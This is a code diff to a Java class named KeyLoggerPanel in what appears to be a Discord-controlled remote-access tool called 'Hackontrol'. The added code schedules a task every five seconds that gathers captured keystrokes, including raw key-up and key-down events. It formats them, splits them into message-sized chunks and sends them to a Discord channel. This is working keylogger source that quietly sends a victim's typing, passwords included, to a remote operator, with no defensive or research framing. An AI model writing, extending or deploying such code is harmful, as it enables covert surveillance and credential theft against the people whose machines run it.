@@ -1,11 +1,19 @@
 package com.khopan.hackontrol.panel;
 
+import java.util.ArrayList;
+import java.util.List;
+import java.util.concurrent.Executors;
+import java.util.concurrent.TimeUnit;
+
 import com.khopan.hackontrol.KeyboardHandler;
+import com.khopan.hackontrol.KeyboardHandler.KeyEntry;
 import com.khopan.hackontrol.registry.Registration;
 import com.khopan.hackontrol.service.interaction.ButtonManager;
 import com.khopan.hackontrol.service.interaction.ButtonManager.ButtonType;
 import com.khopan.hackontrol.service.interaction.context.ButtonContext;
+import com.khopan.hackontrol.utils.HackontrolError;
 import com.khopan.hackontrol.utils.HackontrolMessage;
+import com.khopan.hackontrol.utils.sendable.sender.MessageChannelSendable;
 
 import net.dv8tion.jda.api.interactions.components.buttons.Button;
 
@@ -50,6 +58,27 @@ public class KeyLoggerPanel extends Panel {
 		};
 	}
 
+	@Override
+	public void initialize() {
+		Executors.newSingleThreadScheduledExecutor().scheduleAtFixedRate(() -> {
+			if(!KeyboardHandler.Enable) {
+				KeyboardHandler.KEYSTROKE_LIST.clear();
+				return;
+			}
+
+			if(KeyboardHandler.KEYSTROKE_LIST.isEmpty()) {
+				return;
+			}
+
+			try {
+				this.keylog();
+			} catch(Throwable Errors) {
+				Errors.printStackTrace();
+				HackontrolError.throwable(MessageChannelSendable.of(this.channel), Errors);
+			}
+		}, 5000, 5000, TimeUnit.MILLISECONDS);
+	}
+
 	private void action(ButtonContext context, String text, boolean already, Runnable setter) {
 		if(already) {
 			HackontrolMessage.boldDeletable(context.reply(), text);
@@ -58,5 +87,69 @@ public class KeyLoggerPanel extends Panel {
 
 		setter.run();
 		context.deferEdit().queue();
+	}
+
+	private void keylog() throws Throwable {
+		List<String> messageList = new ArrayList<>();
+		StringBuilder builder = new StringBuilder();
+		boolean first = true;
+		boolean previousSingleCharacter = true;
+		boolean previousSpace = true;
+		int limit = KeyboardHandler.RawKeyMode ? 2000 : 1992;
+		String prefix = KeyboardHandler.RawKeyMode ? "" : "```\n";
+		String suffix = KeyboardHandler.RawKeyMode ? "" : "\n```";
+
+		for(int i = 0; i < KeyboardHandler.KEYSTROKE_LIST.size(); i++) {
+			KeyEntry entry = KeyboardHandler.KEYSTROKE_LIST.get(i);
+			String entryText;
+
+			if(KeyboardHandler.RawKeyMode) {
+				String asterisk = "*".repeat((entry.systemKey ? 2 : 0) + (entry.fake ? 1 : 0));
+				StringBuilder rawKeyBuilder = new StringBuilder();
+				rawKeyBuilder.append(asterisk);
+				rawKeyBuilder.append('`');
+				rawKeyBuilder.append(entry.keyDown ? '↓' : '↑');
+				rawKeyBuilder.append(entry.keyName);
+				rawKeyBuilder.append('`');
+				rawKeyBuilder.append(asterisk);
+				entryText = rawKeyBuilder.toString();
+			} else {
+				if(!entry.keyDown) {
+					continue;
+				}
+
+				entryText = entry.keyName;
+				boolean singleCharacter = entry.keyName.length() == 1;
+				boolean space = entry.keyCode == 0x20;
+
+				if((space || previousSpace) || (singleCharacter && previousSingleCharacter)) {
+					first = true;
+				}
+
+				previousSingleCharacter = singleCharacter;
+				previousSpace = space;
+			}
+
+			entryText = (first ? "" : " ") + entryText;
+			first = false;
+
+			if(builder.length() + entryText.length() > limit) {
+				messageList.add(builder.toString());
+				builder = new StringBuilder();
+				first = true;
+			}
+
+			builder.append(entryText);
+		}
+
+		KeyboardHandler.KEYSTROKE_LIST.clear();
+
+		if(!builder.isEmpty()) {
+			messageList.add(builder.toString());
+		}
+
+		for(int i = 0; i < messageList.size(); i++) {
+			this.channel.sendMessage(prefix + messageList.get(i) + suffix).queue();
+		}
 	}
 }
